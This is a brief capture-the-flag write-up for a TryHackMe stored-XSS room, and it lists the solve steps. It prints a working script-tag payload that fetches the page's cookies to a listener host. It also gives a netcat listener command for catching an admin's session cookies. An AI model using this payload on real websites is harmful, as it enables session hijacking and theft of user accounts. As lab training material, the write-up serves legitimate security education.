# URL
https://tryhackme.com/room/lafb2026e3

# Concept
To Perform a Stored XSS attack using a javascript code

# Method of Solve
- Start the attack box or connect using openvpn
- Start Burpsuite and look for all the endpoints or explore all the endpoints and look for all the Contents and requests type in the endpoints
- Read the description and proceed accordingly
- It is vulnerable to Stored XSS and hence we will create a xss script and then listen on local listener for the admin cookies
  ```
    <script>fetch('http://Target_IP:8000/cookie='+document.cookie)</script>
  ```
- Now we will upload this script in every input field which is URIencoded
- And before submitting the script we will start a nc listener at port 8000 for getting cookies
  ```
    nc -lvnp 8000
  ```
- The Cookies are recieved and flag is Provided.
